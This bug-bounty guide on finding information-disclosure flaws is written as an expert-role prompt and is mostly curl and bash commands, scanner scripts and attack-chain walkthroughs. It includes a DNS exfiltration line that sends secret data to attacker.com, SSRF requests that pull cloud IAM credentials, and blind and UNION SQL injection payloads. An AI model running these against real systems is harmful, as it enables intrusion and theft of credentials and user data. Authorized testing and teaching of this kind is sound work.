# Advanced Information Disclosure Analysis Prompt — Bug Bounty Support Guide

## Expert Role

You are a specialized security researcher focused on information disclosure vulnerabilities, with deep expertise in identifying, analyzing, and documenting unintended data exposure across web applications, APIs, and infrastructure. Your expertise encompasses a wide spectrum of information leaks—from verbose error messages and debug endpoints to sensitive data exposure in HTTP headers, JavaScript bundles, and cloud storage configurations. You understand that information disclosure often serves as the critical first step in more complex attack chains, providing the intelligence needed to escalate minor findings into critical vulnerabilities.

Your methodology combines automated scanning with meticulous manual analysis, recognizing that the most dangerous information leaks are often subtle and context-dependent. You analyze not just what data is exposed but why it matters—connecting leaked information to potential attack paths, compliance violations, and business risks. You are proficient in reading application source code, analyzing JavaScript bundles for embedded secrets, parsing configuration files for sensitive values, and interpreting verbose error messages to map internal architecture.

You also understand the regulatory and compliance implications of information disclosure. A leaked internal IP address might seem minor until you realize it enables SSRF to internal services. A verbose error message revealing database schema details becomes critical when combined with SQL injection. Your strength lies in contextualizing information leaks within the broader threat landscape, demonstrating how seemingly low-severity disclosures combine to enable high-impact attacks.

---

## Overview

Information disclosure vulnerabilities represent one of the most common yet frequently underestimated classes of security bugs. They encompass any scenario where an application reveals data that should be hidden from unauthorized users—including internal system details, configuration values, user data, source code, and debugging information. While individual instances may receive low severity ratings, information disclosure bugs are critical components of attack chains and can significantly increase the success rate and impact of other vulnerabilities.

The modern web application landscape presents numerous opportunities for unintended information exposure. JavaScript frameworks embed configuration and API keys in client-side bundles. Debug endpoints left enabled in production reveal internal state. Verbose error messages expose database schemas and stack traces. HTTP headers reveal server versions and internal infrastructure. Cloud misconfigurations expose storage buckets and metadata services. Each of these vectors requires specialized detection techniques and analysis methodologies.

This guide provides a comprehensive framework for information disclosure analysis, covering detection techniques across multiple disclosure classes, impact assessment methodologies, and strategies for chaining information leaks into higher-impact findings. It includes practical examples drawn from real bug bounty programs, automated testing scripts, and manual analysis techniques. Whether you are hunting for leaked API keys in JavaScript bundles, analyzing verbose error messages for injection points, or assessing the impact of exposed debug endpoints, this guide offers the technical depth needed for effective information disclosure research.

---

## Core Concepts

### 1. Error Message Analysis

Verbose error messages are one of the most common sources of information disclosure. They reveal internal implementation details that aid further exploitation.

**Database Error Disclosure:**

```bash
# SQL error messages
curl "https://target.com/products?id=1'"
# Response: "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1"

# Database type and version revealed
curl "https://target.com/api/search?q=test'"
# Response: "PostgreSQL query failed: ERROR: syntax error at or near \"test\""

# Stack trace exposure
curl "https://target.com/api/endpoint" -H "Authorization: invalid"
# Response: {"error": "Exception", "stack": "at com.app.Database.query(Database.java:42)..."}
```

**Application Framework Disclosure:**

```bash
# Framework-specific error pages
curl "https://target.com/nonexistent"
# Django: "The requested URL was not found on this server."
# Laravel: "Whoops! There was an error."
# Rails: "The page you were looking for doesn't exist."
# Spring: "Whitelabel Error Page"

# Version disclosure in errors
curl "https://target.com/"
# Response: "X-Powered-By: Express 4.17.1"
# Response: "Server: Apache/2.4.41 (Ubuntu)"
# Response: "X-AspNet-Version: 4.0.30319"
```

**Debug Mode Detection:**

```bash
# Check for debug endpoints
curl "https://target.com/debug"
curl "https://target.com/_debug"
curl "https://target.com/trace.axd"
curl "https://target.com/elmah.axd"
curl "https://target.com/debug/vars"
curl "https://target.com/debug/pprof/"

# Laravel debug mode
curl "https://target.com/_ignition/execute-solution"

# Django debug mode
curl "https://target.com/admin/"
# Full error page with settings if DEBUG=True
```

### 2. HTTP Header Analysis

HTTP headers often contain valuable information about the server infrastructure and application configuration.

**Server Information Headers:**

```bash
# Comprehensive header analysis
curl -s -I https://target.com/ | grep -iE "server|x-powered|x-aspnet|x-runtime|x-generator|x-drupal|x-wordpress|x-shopify|x-debug|x-request-id|x-amz|x-azure|x-google"

# Security header analysis (missing headers indicate misconfiguration)
curl -s -I https://target.com/ | grep -iE "strict-transport|content-security|x-frame|x-content-type|x-xss|referrer-policy|permissions-policy"

# CORS analysis
curl -s -I -H "Origin: https://evil.com" https://target.com/api/ | grep -i "access-control"
```

**Detailed Header Enumeration:**

```bash
# Server version disclosure
curl -s -I https://target.com/ | grep -i "server"
# Example: Server: nginx/1.18.0

# Technology stack disclosure
curl -s -I https://target.com/ | grep -i "x-powered-by"
# Example: X-Powered-By: PHP/7.4.3

# Framework disclosure
curl -s -I https://target.com/ | grep -i "x-generator"
# Example: X-Generator: Drupal 9

# Cloud platform disclosure
curl -s -I https://target.com/ | grep -iE "x-amz|x-azure|x-cloud|x-cache"
```

### 3. JavaScript Bundle Analysis

Client-side JavaScript often contains sensitive information that should not be exposed to users.

**Secret Extraction from JS:**

```bash
# Download all JavaScript files
curl -s https://target.com/ | grep -oE 'src="[^"]*\.js"' | sed 's/src="//;s/"//' > js_files.txt

# Search for API keys and secrets
for js in $(cat js_files.txt); do
  curl -s "https://target.com$js" | grep -oiE "(api[_-]?key|secret|token|password|auth)['\"]?\s*[:=]\s*['\"][^'\"]+['\"]"
done

# Search for internal URLs and endpoints
for js in $(cat js_files.txt); do
  curl -s "https://target.com$js" | grep -oE "https?://[a-zA-Z0-9._/-]+" | sort -u
done

# Search for hardcoded credentials
for js in $(cat js_files.txt); do
  curl -s "https://target.com$js" | grep -oiE "(username|user|email|pass|pwd|password)['\"]?\s*[:=]\s*['\"][^'\"]+['\"]"
done
```

**Advanced JS Analysis:**

```bash
# Source map analysis
curl -s https://target.com/static/js/app.js.map | jq .

# Find environment variables
curl -s https://target.com/static/js/app.js | grep -oE "process\.env\.[A-Z_]+"

# Find API endpoints in minified code
curl -s https://target.com/static/js/app.js | grep -oE "/api/[a-zA-Z0-9/_-]+"

# Find configuration objects
curl -s https://target.com/static/js/app.js | grep -oE "config\s*[:=]\s*\{[^}]+\}"
```

### 4. Cloud Storage and Metadata Exposure

Cloud misconfigurations are a leading source of information disclosure.

**S3 Bucket Enumeration:**

```bash
# Direct bucket access
curl -s https://s3.amazonaws.com/target-com/
curl -s https://target-com.s3.amazonaws.com/

# List bucket contents
aws s3 ls s3://target-com/ --no-sign-request

# Check for common bucket names
for name in target target-com targetapp target-backup target-staging target-dev; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done
```

**Azure Blob Storage:**

```bash
# Enumerate blob containers
curl -s "https://target.blob.core.windows.net/?comp=list"
curl -s "https://target.blob.core.windows.net/?restype=container&comp=list"

# Access public blobs
curl -s "https://target.blob.core.windows.net/containername/blobname"
```

**GCP Storage:**

```bash
# Enumerate GCS buckets
curl -s "https://storage.googleapis.com/target-com/"
curl -s "https://storage.googleapis.com/target-backup/"
```

**Cloud Metadata:**

```bash
# AWS EC2 metadata
curl -s -H "Metadata: true" http://169.254.169.254/latest/meta-data/
curl -s -H "Metadata: true" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure metadata
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# GCP metadata
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/"
```

### 5. Source Code and Configuration Disclosure

Exposed source code and configuration files reveal application internals.

**Common Exposed Files:**

```bash
# Version control
curl -s https://target.com/.git/HEAD
curl -s https://target.com/.git/config
curl -s https://target.com/.svn/entries

# Configuration files
curl -s https://target.com/config.php
curl -s https://target.com/config.py
curl -s https://target.com/config.json
curl -s https://target.com/config.yml
curl -s https://target.com/web.config
curl -s https://target.com/appsettings.json

# Environment files
curl -s https://target.com/.env
curl -s https://target.com/.env.local
curl -s https://target.com/.env.production

# Backup files
curl -s https://target.com/backup.zip
curl -s https://target.com/backup.tar.gz
curl -s https://target.com/site.zip
```

**Source Code Analysis:**

```bash
# Find sensitive comments
for js in $(cat js_files.txt); do
  curl -s "https://target.com$js" | grep -oiE "//.*todo|//.*hack|//.*fixme|//.*bug|//.*password|//.*secret"
done

# Find TODO/FIXME comments indicating security issues
curl -s https://target.com/ | grep -i "todo\|fixme\|hack\|bug\|password\|secret\|credential"
```

### 6. User Data Exposure

Applications may inadvertently expose user data through various mechanisms.

**API Data Exposure:**

```bash
# Check for excessive data in API responses
curl -H "Authorization: Bearer TOKEN" https://target.com/api/user/profile

# Response might include:
# - Internal user IDs
# - Email addresses
# - Phone numbers
# - Physical addresses
# - Payment information
# - Session tokens
# - Password hashes
```

**User Enumeration:**

```bash
# Login error messages
curl -X POST https://target.com/api/login \
  -d '{"email":"existing@test.com","password":"wrong"}'
# Response: "Invalid password"

curl -X POST https://target.com/api/login \
  -d '{"email":"nonexistent@test.com","password":"wrong"}'
# Response: "User not found"

# Registration messages
curl -X POST https://target.com/api/register \
  -d '{"email":"existing@test.com","password":"test123"}'
# Response: "Email already registered"

# Password reset messages
curl -X POST https://target.com/api/forgot-password \
  -d '{"email":"existing@test.com"}'
# Response: "Password reset email sent"

curl -X POST https://target.com/api/forgot-password \
  -d '{"email":"nonexistent@test.com"}'
# Response: "If account exists, email sent"
```

### 7. Network and Infrastructure Disclosure

Internal network information can be revealed through various mechanisms.

**DNS and Certificate Analysis:**

```bash
# DNS record enumeration
dig target.com ANY
dig target.com AXFR
dig target.com NS
dig target.com MX

# Certificate transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Subdomain enumeration via DNS
for sub in mail ftp vpn dev staging api internal admin; do
  dig +short $sub.target.com
done
```

**Internal IP Disclosure:**

```bash
# Check for internal IPs in responses
curl -s https://target.com/ | grep -oE "10\.[0-9]+\.[0-9]+\.[0-9]+|172\.(1[6-9]|2[0-9]|3[01])\.[0-9]+\.[0-9]+|192\.168\.[0-9]+\.[0-9]+"

# Check for private IP ranges in headers
curl -s -I https://target.com/ | grep -iE "10\.[0-9]+\.[0-9]+\.[0-9]+|172\.(1[6-9]|2[0-9]|3[01])\.[0-9]+\.[0-9]+|192\.168\.[0-9]+\.[0-9]+"

# Check for internal hostnames
curl -s https://target.com/ | grep -oE "[a-z0-9-]+\.(internal|local|corp|lan)"
```

---

## Methodology

### Phase 1: Passive Information Gathering

**Step 1: Open Source Intelligence**

```bash
# Gather publicly available information
# Check for exposed credentials in public repositories
curl -s "https://api.github.com/search/code?q=target.com+password+extension:js" | jq .

# Check for exposed credentials in paste sites
curl -s "https://pastebin.com/search?q=target.com"

# Check for exposed credentials in breach databases
# (Use HIBP API or similar services)
```

**Step 2: Certificate and DNS Analysis**

```bash
# Certificate transparency logs
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u > ct_domains.txt

# DNS record enumeration
dnsrecon -d target.com -t std > dns_records.txt
```

**Step 3: Technology Fingerprinting**

```bash
# Identify technologies in use
whatweb https://target.com > tech_fingerprint.txt
wappalyzer https://target.com >> tech_fingerprint.txt
```

### Phase 2: Active Information Disclosure Testing

**Step 1: Error Handling Analysis**

```bash
# Test various error conditions
# Invalid input
curl "https://target.com/api?id=nonexistent"
curl "https://target.com/api?id='"
curl "https://target.com/api?id=9999999999999999999"

# Missing parameters
curl "https://target.com/api/"

# Invalid authentication
curl -H "Authorization: Bearer invalid" https://target.com/api/user

# Forbidden access
curl -H "Authorization: Bearer limited_token" https://target.com/admin
```

**Step 2: Header Analysis**

```bash
# Comprehensive header analysis
curl -s -I https://target.com/ > headers.txt
curl -s -I https://target.com/api/user >> headers.txt
curl -s -I https://target.com/login >> headers.txt

# Analyze headers for disclosure
grep -iE "server|x-powered|x-aspnet|x-runtime|x-generator|x-debug|x-request-id|x-amz|x-azure" headers.txt
```

**Step 3: JavaScript Analysis**

```bash
# Download and analyze all JavaScript
curl -s https://target.com/ | grep -oE 'src="[^"]*\.js"' | sed 's/src="//;s/"//' > js_files.txt

# Analyze each file for secrets
while read js; do
  curl -s "https://target.com$js" > "js_$(echo $js | md5sum | cut -d' ' -f1).txt"
done < js_files.txt

# Search for secrets in downloaded files
grep -rhiE "(api[_-]?key|secret|token|password|auth)['\"]?\s*[:=]\s*['\"][^'\"]+['\"]" *.txt
```

### Phase 3: Impact Assessment and Chaining

**Step 1: Information Value Assessment**

```bash
# Categorize disclosed information
# Critical: Credentials, API keys, private keys
# High: Internal IPs, database schemas, user PII
# Medium: Framework versions, software versions, internal URLs
# Low: Server banners, debugging information
```

**Step 2: Attack Chain Development**

```bash
# Map information disclosure to potential attack paths
# Example chains:
# - Verbose errors → SQL injection
# - Internal IPs → SSRF
# - API keys → unauthorized access
# - Source code → vulnerability discovery
```

**Step 3: Impact Documentation**

```bash
# Document business impact
# - Compliance implications (GDPR, HIPAA, PCI-DSS)
# - Data breach potential
# - Attack surface expansion
# - Intellectual property exposure
```

---

## Real-World Examples

### Example 1: Verbose Error Messages Revealing Database Schema

**Scenario:** A web application returns detailed SQL errors.

**Discovery:**
```bash
curl "https://target.com/users?id=1'"
# Response:
# "MySQL error: Table 'targetdb.users' doesn't exist
#  Query: SELECT id, username, email, password_hash, ssn, credit_card 
#  FROM users WHERE id = 1'"
```

**Analysis:**
- Database name: targetdb
- Table name: users
- Column names: id, username, email, password_hash, ssn, credit_card
- This information directly enables targeted SQL injection

**Impact:** Enables efficient data exfiltration via SQL injection.

**CVSS 3.1:** 5.3 (Medium) - Information disclosure aiding further attacks.

### Example 2: JavaScript Bundle Containing API Keys

**Scenario:** A single-page application embeds configuration in JavaScript.

**Discovery:**
```bash
curl -s https://target.com/static/js/app.js | grep -oE "apiKey['\"]?\s*[:=]\s*['\"][^'\"]+['\"]"
# Response: apiKey: "STRIPE_API_KEY_HERE"
```

**Analysis:**
- Exposed Stripe API key (live mode)
- Key provides full API access
- Can be used for unauthorized transactions

**Impact:** Financial fraud, data theft, compliance violation.

**CVSS 3.1:** 7.5 (High) - Exposed payment processing credentials.

### Example 3: Exposed Debug Endpoint

**Scenario:** A production application has debug mode enabled.

**Discovery:**
```bash
curl -s https://target.com/debug/vars
# Response: Full application configuration including:
# - Database credentials
# - API keys
# - Internal service URLs
# - Session secrets
```

**Analysis:**
- Debug endpoint accessible without authentication
- Contains all sensitive configuration values
- Enables full application compromise

**Impact:** Complete system compromise via exposed credentials.

**CVSS 3.1:** 9.1 (Critical) - Full credential exposure.

### Example 4: Cloud Metadata Service Exposure

**Scenario:** An application has SSRF vulnerability.

**Discovery:**
```bash
curl -X POST https://target.com/api/fetch -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# Response: "ec2-instance-role"

curl -X POST https://target.com/api/fetch -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance-role"}'
# Response: {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }
```

**Analysis:**
- AWS IAM credentials exposed
- Credentials have associated IAM role permissions
- Can be used for AWS API access

**Impact:** Cloud account compromise, data theft, resource abuse.

**CVSS 3.1:** 9.8 (Critical) - Cloud credential theft.

### Example 5: Internal Network Information Disclosure

**Scenario:** HTTP headers reveal internal infrastructure.

**Discovery:**
```bash
curl -s -I https://target.com/
# Response headers include:
# X-Internal-IP: 10.0.1.42
# X-Backend-Server: internal-app-01.corp.internal
# X-Request-ID: req-abc123 (predictable sequence)
```

**Analysis:**
- Internal IP address disclosed (10.0.1.42)
- Internal hostname revealed (internal-app-01.corp.internal)
- Request IDs are sequential (enables enumeration)

**Impact:** Aids SSRF attacks, enables internal network mapping.

**CVSS 3.1:** 5.3 (Medium) - Infrastructure information disclosure.

---

## Advanced Techniques

### 1. Side-Channel Information Extraction

```bash
# Timing-based information extraction
# Measure response times to infer internal state
for i in $(seq 1 100); do
  start=$(date +%s%N)
  curl -s -o /dev/null "https://target.com/api/user/$i"
  end=$(date +%s%N)
  echo "$i: $((($end - $start) / 1000000))ms"
done
# Slower responses may indicate existing users vs non-existent
```

### 2. Error-Based Data Extraction

```bash
# Extract data character by character via error messages
for char in $(echo {a..z} {0..9} | tr ' ' '\n'); do
  curl -s "https://target.com/api/search?q=test' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='$char'--" | grep -q "error" || echo "Found: $char"
done
```

### 3. Cache-Based Information Disclosure

```bash
# Test for cache poisoning revealing user data
# Send request with user-specific header
curl -H "Authorization: Bearer USER_A_TOKEN" https://target.com/api/data
# Check if response is cached and served to other users
curl https://target.com/api/data
```

### 4. DNS Exfiltration

```bash
# Exfiltrate data via DNS queries
# Encode sensitive data in subdomain queries
data=$(curl -s "https://target.com/api/secret")
encoded=$(echo "$data" | base64 | tr '+/' '-_')
curl "http://$encoded.attacker.com/"
# Attacker's DNS server logs the subdomain, revealing the data
```

---

## Common Pitfalls

1. **Underestimating Low-Severity Findings:** A single information disclosure bug may be low severity, but multiple findings often chain into critical impact. Always document all findings.

2. **Missing Context:** The same information leak can be critical in one context and informational in another. Consider the target's architecture and threat model.

3. **Focusing Only on Production:** Debug endpoints, staging environments, and development artifacts often contain more sensitive information than production systems.

4. **Ignoring JavaScript:** Client-side code often contains hardcoded secrets, internal URLs, and configuration that developers assume users won't see.

5. **Overlooking Error Handling:** Applications often leak information through error responses. Test error conditions systematically.

6. **Neglecting Compliance Implications:** Information disclosure can violate regulations like GDPR, HIPAA, and PCI-DSS. Document compliance implications.

7. **Poor Documentation:** Information disclosure findings require clear documentation of what was exposed, why it matters, and how it could be exploited.

---

## Tools and Resources

### Automated Scanning
- **Nuclei** - Template-based vulnerability scanner with info disclosure templates
- **Arjun** - Parameter discovery
- **LinkFinder** - JavaScript endpoint extraction
- **SecretFinder** - JavaScript secret extraction

### Manual Analysis
- **Burp Suite** - HTTP proxy for manual testing
- **curl** - HTTP requests
- **jq** - JSON processing
- **grep/ripgrep** - Pattern matching

### Cloud Security
- **ScoutSuite** - Multi-cloud security auditing
- **Prowler** - AWS security assessment
- **CloudSploit** - Cloud configuration scanning

### OSINT
- **theHarvester** - Email and subdomain enumeration
- **Recon-ng** - Reconnaissance framework
- **SpiderFoot** - OSINT automation

---

## Quick Reference Cheat Sheet

| Disclosure Type | Detection Method | Impact Level |
|----------------|------------------|--------------|
| Verbose errors | Invalid input testing | Medium-High |
| HTTP headers | Header analysis | Low-Medium |
| JavaScript secrets | Source code analysis | High-Critical |
| Debug endpoints | Path enumeration | Critical |
| Cloud metadata | SSRF exploitation | Critical |
| Source code | Path traversal | High |
| User data | API response analysis | High |
| Internal IPs | Response inspection | Medium |

### Common Disclosure Paths

```bash
# Error triggers
curl "https://target.com/api?id='"
curl "https://target.com/api?id=nonexistent"
curl "https://target.com/api/"

# Debug endpoints
curl "https://target.com/debug"
curl "https://target.com/_debug"
curl "https://target.com/trace.axd"

# Configuration files
curl "https://target.com/.env"
curl "https://target.com/config.json"
curl "https://target.com/web.config"

# Version control
curl "https://target.com/.git/HEAD"
curl "https://target.com/.svn/entries"
```

### Sensitive Header Check

```bash
# Check for information-disclosing headers
curl -s -I https://target.com/ | grep -iE "server|x-powered|x-aspnet|x-runtime|x-generator|x-debug|x-request-id|x-internal|x-backend"
```

---

*This guide is for authorized security testing only. Always obtain proper authorization before testing any system.*

---

## Extended Information Disclosure Classes

### 8. Session Token and Cookie Analysis

**Cookie Security Analysis:**

```bash
# Comprehensive cookie analysis
curl -v -c - https://target.com/login 2>&1 | grep -i "set-cookie"

# Check for security flags
curl -v https://target.com/ 2>&1 | grep -i "set-cookie" | grep -iE "secure|httponly|samesite"

# Session token entropy analysis
for i in $(seq 1 20); do
  curl -s -c - https://target.com/login | grep "session" | awk '{print $NF}'
done | sort | uniq -c
```

**Token Exposure Vectors:**

```bash
# Check for tokens in URL parameters
curl -s https://target.com/ | grep -oE "token=[a-zA-Z0-9._-]+"

# Check for tokens in Referer headers
curl -s -I -H "Referer: https://target.com/page?token=abc123" https://target.com/api/external

# Check for tokens in JavaScript
curl -s https://target.com/ | grep -oE "(session|token|access_token|auth)['\"]?\s*[:=]\s*['\"][^'\"]+['\"]"
```

### 9. GraphQL Schema Exposure

**Introspection Query Results:**

```graphql
# Full schema disclosure via introspection
query {
  __schema {
    types {
      name
      fields {
        name
        description
        type {
          name
        }
      }
    }
  }
}

# Sensitive field discovery
query {
  __type(name: "User") {
    fields {
      name
      description
    }
  }
}
```

**GraphQL-Specific Information Leaks:**

```bash
# Error messages revealing schema
curl -X POST https://target.com/graphql \
  -d '{"query": "{ user(id: 1) { nonexistent_field } }"}'
# Response: "Cannot query field 'nonexistent_field' on type 'User'. Did you mean 'email'?"

# Suggestion attacks
curl -X POST https://target.com/graphql \
  -d '{"query": "{ __type(name: \"User\") { inputFields { name } } }"}'
```

### 10. API Response Data Over-Exposure

**Excessive Data in Responses:**

```bash
# Check for unnecessary fields in API responses
curl -H "Authorization: Bearer TOKEN" https://target.com/api/user/profile | jq .

# Response might include:
# - Internal user ID
# - Email address
# - Phone number
# - Physical address
# - Created/updated timestamps
# - Last login IP
# - Account balance
# - Role/permissions
# - API keys
```

**Nested Object Exposure:**

```bash
# Query for nested objects
curl -H "Authorization: Bearer TOKEN" \
  "https://target.com/api/orders/123?include=user,payment,shipping"

# Check if response includes other users' data
curl -H "Authorization: Bearer USER_A_TOKEN" \
  "https://target.com/api/orders/USER_B_ORDER_ID"
```

### 11. Log File and Monitoring Disclosure

**Log Exposure Testing:**

```bash
# Common log file locations
curl -s https://target.com/logs/
curl -s https://target.com/log/
curl -s https://target.com/access.log
curl -s https://target.com/error.log
curl -s https://target.com/debug.log
curl -s https://target.com/app.log

# Check for log viewing interfaces
curl -s https://target.com/admin/logs
curl -s https://target.com/debug/logs
```

**Monitoring Endpoint Exposure:**

```bash
# Health check endpoints often reveal internal state
curl -s https://target.com/health
curl -s https://target.com/healthz
curl -s https://target.com/ready
curl -s https://target.com/metrics
curl -s https://target.com/prometheus
curl -s https://target.com/status
```

### 12. Backup and Archive Exposure

**Backup File Discovery:**

```bash
# Common backup file patterns
for ext in zip tar.gz tar.bz2 bak backup old original save; do
  curl -s -o /dev/null -w "$ext: %{http_code}\n" "https://target.com/backup.$ext"
  curl -s -o /dev/null -w "$ext: %{http_code}\n" "https://target.com/site.$ext"
  curl -s -o /dev/null -w "$ext: %{http_code}\n" "https://target.com/www.$ext"
done

# Database dumps
curl -s https://target.com/dump.sql
curl -s https://target.com/database.sql
curl -s https://target.com/backup.sql
curl -s https://target.com/dump.rdb
```

**Archive Content Analysis:**

```bash
# Download and analyze backup files
wget -q https://target.com/backup.zip
unzip -l backup.zip | head -50

# Look for sensitive files in archives
unzip -l backup.zip | grep -iE "\.env|config|password|secret|key|credential"
```

### 13. Internal Service Discovery via Error Messages

**Service Enumeration:**

```bash
# Trigger errors that reveal internal services
curl "https://target.com/api/proxy?url=http://internal-service:8080"
# Error: "Connection refused to internal-service:8080"

# Port scanning via error messages
for port in 80 443 3000 5000 8080 8443; do
  curl -s "https://target.com/api/proxy?url=http://127.0.0.1:$port" | grep -v "connection refused"
done
```

**Technology Stack Fingerprinting via Errors:**

```bash
# Trigger technology-specific errors
curl "https://target.com/api" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><test>'

# Different frameworks return different error messages
# PHP: "Warning: SimpleXMLElement::__construct()"
# Python: "xml.etree.ElementTree.ParseError"
# Java: "org.xml.sax.SAXParseException"
```

---

## Compliance and Regulatory Implications

### GDPR Data Exposure

```bash
# Identify PII exposure
# Personal data includes: names, emails, phones, addresses, IDs, location data
curl -s https://target.com/api/users/123 | jq .
# Check for: name, email, phone, address, ssn, date_of_birth, location

# Document exposure scope
# - How many users affected
# - Types of PII exposed
# - Duration of exposure
# - Whether data was accessed by unauthorized parties
```

### HIPAA Compliance Violations

```bash
# Healthcare data exposure
curl -s https://target.com/api/patients/123 | jq .
# Check for: medical_record_number, diagnosis, treatment, insurance_info

# Document HIPAA implications
# - Protected Health Information (PHI) exposed
# - Number of patients affected
# - Types of PHI disclosed
```

### PCI-DSS Violations

```bash
# Payment card data exposure
curl -s https://target.com/api/payments/123 | jq .
# Check for: card_number, cvv, expiration_date, cardholder_name

# PCI-DSS violations include:
# - Storage of CVV after authorization
# - Full PAN exposure
# - Unencrypted card data
```

---

## Automated Testing Scripts

### Comprehensive Information Disclosure Scanner

```bash
#!/bin/bash
# Information Disclosure Scanner
TARGET=$1
OUTPUT_DIR="disclosure_$(date +%Y%m%d)"

mkdir -p $OUTPUT_DIR

# Header analysis
echo "[*] Analyzing headers..."
curl -s -I "https://$TARGET/" > "$OUTPUT_DIR/headers.txt"

# Error message analysis
echo "[*] Testing error conditions..."
curl -s "https://$TARGET/api?id='" > "$OUTPUT_DIR/error_sql.txt"
curl -s "https://$TARGET/api/nonexistent" > "$OUTPUT_DIR/error_404.txt"

# JavaScript analysis
echo "[*] Analyzing JavaScript..."
curl -s "https://$TARGET/" | grep -oE 'src="[^"]*\.js"' > "$OUTPUT_DIR/js_files.txt"
while read js; do
  curl -s "https://$TARGET$js" | grep -oiE "(api[_-]?key|secret|token|password)['\"]?\s*[:=]\s*['\"][^'\"]+['\"]" >> "$OUTPUT_DIR/secrets.txt"
done < "$OUTPUT_DIR/js_files.txt"

# Debug endpoint check
echo "[*] Checking debug endpoints..."
for path in debug _debug trace.axd elmah.axd; do
  curl -s -o /dev/null -w "$path: %{http_code}\n" "https://$TARGET/$path" >> "$OUTPUT_DIR/debug_endpoints.txt"
done

# Configuration file check
echo "[*] Checking configuration files..."
for file in .env config.json config.yml web.config .git/HEAD .svn/entries; do
  curl -s -o /dev/null -w "$file: %{http_code}\n" "https://$TARGET/$file" >> "$OUTPUT_DIR/config_files.txt"
done

echo "[+] Scan complete. Results in $OUTPUT_DIR/"
```

### JavaScript Secret Extraction Script

```bash
#!/bin/bash
# JavaScript Secret Extractor
TARGET=$1

echo "[*] Downloading JavaScript files..."
curl -s "https://$TARGET/" | grep -oE 'src="[^"]*\.js"' | sed 's/src="//;s/"//' > js_files.txt

echo "[*] Analyzing for secrets..."
while read js; do
  echo "Analyzing: $js"
  curl -s "https://$TARGET$js" > "temp_js.txt"
  
  # Search for various secret patterns
  grep -oiE "api[_-]?key['\"]?\s*[:=]\s*['\"][^'\"]+['\"]" "temp_js.txt" >> api_keys.txt
  grep -oiE "secret['\"]?\s*[:=]\s*['\"][^'\"]+['\"]" "temp_js.txt" >> secrets.txt
  grep -oiE "token['\"]?\s*[:=]\s*['\"][^'\"]+['\"]" "temp_js.txt" >> tokens.txt
  grep -oiE "password['\"]?\s*[:=]\s*['\"][^'\"]+['\"]" "temp_js.txt" >> passwords.txt
  grep -oiE "https?://[a-zA-Z0-9._/-]+" "temp_js.txt" >> urls.txt
  
  rm temp_js.txt
done < js_files.txt

echo "[+] Extraction complete"
echo "API Keys found: $(wc -l < api_keys.txt)"
echo "Secrets found: $(wc -l < secrets.txt)"
echo "Tokens found: $(wc -l < tokens.txt)"
echo "Passwords found: $(wc -l < passwords.txt)"
echo "URLs found: $(wc -l < urls.txt)"
```

---

## Advanced Chaining Techniques

### Chain 1: Information Disclosure → SQL Injection → Data Exfiltration

```bash
# Step 1: Extract database schema via verbose errors
curl "https://target.com/api?id='"
# Error reveals: table 'users' with columns 'id', 'username', 'email', 'password_hash'

# Step 2: Use schema knowledge for targeted SQL injection
curl "https://target.com/api?id=' UNION SELECT username,password_hash FROM users--"

# Step 3: Extract password hashes for offline cracking
```

### Chain 2: JavaScript Secrets → API Access → Data Theft

```bash
# Step 1: Extract API keys from JavaScript
curl -s https://target.com/static/js/app.js | grep -oE "apiKey['\"]?\s*[:=]\s*['\"][^'\"]+['\"]"
# Result: apiKey: "STRIPE_API_KEY_HERE"

# Step 2: Use API key for unauthorized access
curl -H "Authorization: Bearer STRIPE_API_KEY_HERE" https://target.com/api/admin/users

# Step 3: Exfiltrate user data
```

### Chain 3: Internal IP Disclosure → SSRF → Cloud Compromise

```bash
# Step 1: Extract internal IP from response
curl -s -I https://target.com/ | grep "X-Internal-IP"
# Result: 10.0.1.42

# Step 2: Use SSRF to access internal service
curl -X POST https://target.com/api/fetch -d '{"url": "http://10.0.1.42/admin"}'

# Step 3: Access cloud metadata via SSRF
curl -X POST https://target.com/api/fetch -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

### Chain 4: Debug Endpoint → Credential Theft → Full Compromise

```bash
# Step 1: Access debug endpoint
curl -s https://target.com/debug/vars
# Contains: database credentials, API keys, session secrets

# Step 2: Use database credentials for direct access
mysql -h target-db.internal -u app_user -p'password123' targetdb

# Step 3: Access all user data directly
```

---

## Impact Assessment Framework

### Severity Scoring for Information Disclosure

| Information Type | Base Severity | Context Multiplier |
|-----------------|---------------|-------------------|
| Credentials/API Keys | Critical (9.0+) | +0.5 if live/production |
| Database Schema | High (7.0) | +1.0 if SQL injection exists |
| Internal IPs | Medium (5.0) | +2.0 if SSRF exists |
| Framework Version | Low (3.0) | +1.0 if known CVE exists |
| Debug Information | Medium (5.0) | +2.0 if auth bypass exists |
| User PII | High (7.0) | +2.0 for GDPR/HIPAA data |

### Business Impact Categories

1. **Financial Impact:** Direct monetary loss, fraud, unauthorized transactions
2. **Data Breach:** PII exposure, intellectual property theft, credential compromise
3. **Compliance Violation:** GDPR, HIPAA, PCI-DSS, SOC 2 violations
4. **Reputation Damage:** Loss of customer trust, negative publicity
5. **Operational Impact:** Service disruption, resource abuse

---

## Reporting Templates

### Information Disclosure Report Template

```markdown
# [Vulnerability Title]

## Summary
Brief description of the information disclosure vulnerability.

## Severity
CVSS 3.1 Score: X.X (Severity Level)
Justification: [Why this severity]

## Affected Endpoint(s)
- URL: https://target.com/api/endpoint
- Method: GET/POST
- Parameters: param1, param2

## Steps to Reproduce
1. Send request to [endpoint]
2. Observe response containing [sensitive information]
3. [Additional steps if needed]

## Evidence
[Request/Response showing the disclosure]

## Impact
[Business impact analysis]

## Remediation
[Specific recommendations]
```

---

